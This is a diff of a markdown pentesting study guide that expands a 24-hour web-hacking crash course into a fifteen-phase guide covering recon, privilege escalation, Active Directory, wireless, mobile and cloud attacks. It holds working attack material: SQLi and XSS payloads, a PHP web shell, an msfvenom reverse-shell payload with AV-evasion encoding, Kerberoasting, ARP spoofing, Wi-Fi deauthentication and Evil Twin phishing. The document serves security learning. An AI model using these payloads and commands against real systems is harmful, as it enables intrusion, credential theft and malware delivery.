@@ -1,232 +1,300 @@
-# 🛡️ 24-Hour Ethical Hacking & Web App Pentesting Crash Course
+# 🛡️ Complete Ethical Hacking & Web App Pentesting Guide
 
-Cut the fluff. Here's your high-ROI, battle-tested roadmap to go from zero to dangerous in **web application security and ethical hacking** — fast.
+No time constraints now — this version offers full explanations, advanced examples, and complete tooling.
 
 ---
 
-## ⚙️ PHASE 1: Setup & Mindset (1 Hour Max)
+## ⚙️ PHASE 1: Setup & Mindset
 
 ### ✅ Essential Tools
+- **OS**: Kali Linux or Parrot OS (preloaded with hacking tools)
+- **Browser**: Firefox + HackBar, FoxyProxy (for manual testing)
+- **Proxy**: [Burp Suite](https://portswigger.net/burp) (manual proxy-based testing)
+- **Recon**: `nmap`, `ffuf`, `subfinder`, `httpx` (host discovery and directory fuzzing)
+- **Exploitation**: `sqlmap`, `XSStrike`, `wfuzz` (automation tools)
+- **Practice Labs**: HackTheBox, TryHackMe, PortSwigger Labs
 
-- **OS**: Kali Linux or Parrot OS
-- **Browser**: Firefox + Extensions:
-  - HackBar
-  - FoxyProxy
-- **Proxy**: [Burp Suite Community](https://portswigger.net/burp)
-- **Recon Tools**: `nmap`, `ffuf`, `dirsearch`, `assetfinder`, `httpx`
-- **Exploitation Tools**: `sqlmap`, `wfuzz`, `XSStrike`
-- **Labs for Practice**:
-  - [Hack The Box](https://hackthebox.com)
-  - [TryHackMe](https://tryhackme.com)
-  - [PortSwigger Web Security Academy](https://portswigger.net/web-security)
+### 🧠 Mindset Tips
+- Think adversarially — “What would an attacker do?”
+- Focus on chaining small bugs for big results
+- Take notes for everything (loot, endpoints, tokens, headers)
 
 ---
 
-## 🕵️ PHASE 2: Recon & Enumeration (2 Hours)
+## 🔍 PHASE 2: Footprinting & Reconnaissance
 
-### 🔍 Recon Workflow
+### 🔎 Passive Recon (No interaction)
+- `whois domain.com`
+- Google Dorks:
+  ```
+  site:target.com intitle:index.of
+  site:target.com inurl:admin
+  ```
+- Netcraft, Shodan.io for open ports and services
 
+### ⚡ Active Recon (Interaction-based)
 ```bash
-# Subdomain Enumeration
-assetfinder --subs-only target.com
-
-# Port Scan
-nmap -sC -sV -T4 -p- target.com
-
-# Directory Discovery
+nmap -sC -sV -A target.com
+subfinder -d target.com | httpx
 ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
-
-# Live Hosts
-subfinder -d target.com | httpx -status-code -title
 ```
 
-> 💡 **Objective:** Map out the attack surface – subdomains, ports, directories, parameters.
+Use Burp Suite's **Spider**, **Target**, and **Repeater** tabs to map the application.
 
 ---
 
-## 💥 PHASE 3: Common Web App Attacks (5–6 Hours)
+## 🕳️ PHASE 3: Vulnerability Analysis
 
-### 🔓 SQL Injection (SQLi)
+### 🛠 Tools
+- `nikto` – scan for outdated software and common misconfigs
+- `nuclei` – templated vulnerability scanner
+- `wpscan` – WordPress-specific testing
 
-#### 🔧 Manual Testing
-```sql
-' OR '1'='1
-" OR 1=1--
-admin'--
-```
+### 🔬 Manual Analysis
+- Look for verbose error messages
+- Test every parameter with `'`, `<script>`, `../`
+- Observe headers, cookies, CSPs
 
-#### 🚀 Automated
+---
+
+## 💣 PHASE 4: System Hacking & Privilege Escalation
+
+### 🔐 Linux PrivEsc (Post-exploitation)
+- Look for SUID binaries:
 ```bash
-sqlmap -u "https://target.com/page.php?id=1" --batch --dump
+find / -perm -4000 -type f 2>/dev/null
 ```
-
----
-
-### 🔥 Cross-Site Scripting (XSS)
-
-#### 🧪 Payloads
-```html
-<script>alert(1)</script>
-"><script>alert(1)</script>
-<img src=x onerror=alert(1)>
-```
-
-#### 🛠 Tool
+- Run `linpeas.sh` or `pspy64` for automated discovery
+- Check sudo privileges:
 ```bash
-xsstrike -u "https://target.com/search?q=test"
+sudo -l
 ```
+- Exploit PATH hijacking or writable scripts by root
+
+### 🪟 Windows PrivEsc
+- Run `winPEAS.exe`
+- Look for unquoted service paths:
+```powershell
+wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows"
+```
+- AlwaysInstallElevated trick:
+```powershell
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+If `1`, you can escalate via MSI payloads.
 
 ---
 
-### 📁 File Upload Vulnerabilities
+## 🏢 PHASE 5: Active Directory Hacking
 
-#### ✅ Bypass Techniques
-```
-shell.php.jpg
-image.php%00.jpg
-shell.pHp
-```
+### 🧠 Key Concepts
+- Everything is about **users, groups, ACLs, and delegation**
+- BloodHound + SharpHound = AD map
 
-#### 🔥 PHP Web Shell
-```php
-<?php echo shell_exec($_GET['cmd']); ?>
-```
-
----
-
-### 🔐 Authentication Bypass
-
-#### 📌 Try These:
-```
-' OR 1=1 --
-admin' --
-```
-
-> Use Burp Suite to manipulate request body, headers, and cookies.
-
----
-
-### 🏑 Insecure Direct Object Reference (IDOR)
-
-#### 🔎 Test:
-- Change `/user/1002` → `/user/1`
-- Replay requests with different IDs
-- Edit JWTs or cookies manually
-
----
-
-## ⚡ PHASE 4: Automation & Shortcuts (3 Hours)
-
-### 🚀 Scripted Recon
-
+### 🔥 Common Attacks
+- **Kerberoasting**:
 ```bash
-# Subdomain & Live Check
-subfinder -d target.com | httpx -status-code -title
+GetUserSPNs.py domain/user:pass -dc-ip <IP> -outputfile hashes.txt
+hashcat -m 13100 hashes.txt wordlist.txt
+```
+- **AS-REP Roasting** – when `Do not require pre-auth` is enabled
+- **DCSync** – abuse `Replicate Directory Changes` permission
 
-# Directory Bruteforce
-ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ -mc 200
+Use `mimikatz`, `crackmapexec`, and `impacket` tools for exploitation
 
-# Port Scanning
-nmap -sC -sV -T4 -p- target.com
+---
+
+## ☠️ PHASE 6: Malware Threats
+
+### 📦 Types
+- Keyloggers, Backdoors, Trojans
+- Rootkits (kernel-level persistence)
+- Ransomware (file encryption + extortion)
+
+### 🛠 Tools
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > evil.exe
+```
+Obfuscate with `veil` or `obfuscator.io`
+
+---
+
+## 🌐 PHASE 7: Network Sniffing & Session Hijacking
+
+### 🧰 Tools
+- `Wireshark`, `tcpdump`, `dsniff`, `ettercap`
+
+### 🧪 Example (ARP Spoofing)
+```bash
+arpspoof -t victimIP gatewayIP
+```
+Capture session cookies and reuse in Burp for hijacking
+
+---
+
+## 🎭 PHASE 8: Social Engineering
+
+### ⚔️ Techniques
+- Phishing (email + payload)
+- Pretexting (impersonation)
+- Vishing (voice phishing)
+
+Use `setoolkit` to create fake login pages or payload delivery sites.
+
+---
+
+## 🕵️ PHASE 9: Evading IDS, Firewalls & Honeypots
+
+### 🧠 Strategies
+- Obfuscate payloads:
+```bash
+msfvenom -p payload -e x86/shikata_ga_nai -i 5 -f exe > evasive.exe
+```
+- Encode payloads in Base64 or Hex
+- Time-based evasion: `--delay` in `sqlmap`, throttling `ffuf`
+- Use randomized headers or fragment requests
+
+---
+
+## 🔥 PHASE 10: Web Server & Web App Hacking (Advanced)
+
+### Web Server Attacks
+- `TRACE`/`PUT` methods
+- Misconfigured file uploads:
+  - Upload `.php` file with image extension
+- Directory traversal: `../../etc/passwd`
+
+### Web App Attacks
+- **SQLi**, **XSS**, **CSRF**, **SSRF**, **IDOR**, **Open Redirect**
+- Test each input manually and with tools
+- Exploit chaining is key:
+  - SSRF → internal service → RCE
+  - IDOR → account takeover
+
+---
+
+## 📶 PHASE 11: Wireless Network Hacking
+
+### 🧰 Tools
+```bash
+airmon-ng start wlan0
+airodump-ng wlan0mon
+aireplay-ng --deauth 10 -a BSSID wlan0mon
+```
+- Capture handshake
+- Crack with `aircrack-ng` or `hashcat`
+
+### 🤖 Automated WiFi Hacking
+- Use `wifite` (automates capture, cracking, and targeting)
+```bash
+wifite
+```
+- Use `fluxion` for Evil Twin attacks (host fake access point, steal creds)
+
+### 🔧 Manual Steps Summary
+1. **Monitor Mode**:
+   ```bash
+   airmon-ng start wlan0
+   ```
+2. **Capture Handshake**:
+   ```bash
+   airodump-ng wlan0mon
+   aireplay-ng -0 10 -a <BSSID> wlan0mon
+   ```
+3. **Crack Handshake**:
+   ```bash
+   aircrack-ng capture.cap -w rockyou.txt
+   ```
+
+---
+
+## 📱 PHASE 12: Mobile Hacking
+
+### Android
+- Reverse APKs:
+```bash
+apktool d app.apk
+jadx-gui app.apk
+```
+- Look for hardcoded secrets, exposed endpoints
+
+### iOS
+- Requires jailbroken device/emulator
+- Use `Frida` + `Objection` for runtime hooking
+
+---
+
+## 🧠 PHASE 13: IoT & OT Hacking
+
+### 🛠 Tools
+- `shodan` to find public-facing interfaces
+- `binwalk` to extract firmware
+- `firmwalker`, `strings`, `ghidra` to analyze firmware binaries
+
+---
+
+## ☁️ PHASE 14: Cloud Hacking
+
+### AWS Example:
+```bash
+aws s3 ls s3://bucket-name --no-sign-request
+```
+- Use `ScoutSuite`, `Pacu`, `CloudSploit`
+- Misconfigs to look for:
+  - Open S3 buckets
+  - Overly permissive IAM roles
+  - Public Lambda/EC2/Secrets
+
+---
+
+## 🔐 PHASE 15: Cryptography Attacks
+
+### 🔍 Common Flaws
+- Use of ECB mode (detectable via patterns)
+- Poor key generation (hardcoded, reused)
+- Predictable randomness
+
+### 🛠 Cracking Hashes
+```bash
+hashcat -m 0 hashes.txt rockyou.txt
 ```
 
-### ↺ Burp Suite Workflow
-
-- **Proxy**: Capture requests
-- **Repeater**: Modify & resend
-- **Intruder**: Fuzz parameters
-- **Logger++**: Track injections
-- **Extensions**: Add things like Autorize, ActiveScan++
-
 ---
 
-## 🧪 PHASE 5: Bug Bounty Focus (3 Hours)
-
-### 🎯 High-Value Vulns
-
-- IDOR (Access Control Bypass)
-- SSRF via image upload or URL fetch
-- Open Redirects
-- Subdomain Takeovers
-- Misconfigured CORS
-- Rate Limiting bypass
-
-### 🧠 Real World Strategy
-
-1. Find a juicy endpoint (e.g. `/api/upload`, `/account/123`)
-2. Tamper everything: headers, body, cookies, params
-3. Automate recon, **manually test logic**
-
----
-
-### 🛠 Top Resources
-
-- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
-- [Bug Bounty Reports](https://hackerone.com/hacktivity)
-- [Bug Bounty Notes](https://bugbountyhunter.com/notes/)
-- [HackTricks](https://book.hacktricks.xyz/)
-
----
-
-## 🧪 PHASE 6: Practice Smarter (4–5 Hours)
-
-### 💻 Do These:
-
-- PortSwigger Labs (focus: SQLi, XSS, IDOR, Auth)
-- 2–3 retired Hack The Box or TryHackMe web boxes
-- Practice building exploit chains (e.g. XSS → cookie theft → admin access)
-
----
-
-## 🧠 Mental Models
-
-- What user input do I control?
-- Where does my input show up in the response?
-- What assumptions does the app make about identity/auth?
-- How can I bypass validation or escalate privilege?
-
----
-
-## 📋 Vulnerability Report Template
-
+## ✅ Reporting Template
 ```markdown
 # [Vulnerability Title]
-
 **Target:** https://target.com/page  
 **Severity:** High
 
 ---
 
 ## 📖 Description
-Explain the issue in plain English.
+Explain clearly.
 
 ---
 
 ## ✅ Steps to Reproduce
-1. Go to https://target.com/login
-2. Enter `' OR 1=1--` in the username field
-3. Log in as admin
+1. Input this
+2. Observe this
 
 ---
 
-## 💨 Impact
-Attacker can bypass authentication and gain unauthorized access.
+## 💥 Impact
+Explain potential damage.
 
 ---
 
 ## 🛠 Recommended Fix
-- Use parameterized queries
-- Sanitize input
-- Implement server-side validation
+- Patch suggestion
 ```
 
 ---
 
-## 💡 Final Advice
+## ⚠️ Final Advice
+- Think like a curious attacker
+- Automate recon, manual exploit
+- Always try to **chain attacks**
+- Practice in **realistic CTF labs**
+- Stay **legal**. Stay **ethical**. Stay **relentless**.
 
-- Think like a **curious attacker**, not a scanner.
-- Automate recon, but **manually explore logic flaws**.
-- Track your payloads, note responses, and always try to **chain vulnerabilities**.
-- **Report ethically** and document clearly.
-
-> 🧠 Stay legal. Stay sharp. Stay dangerous (in a good way).
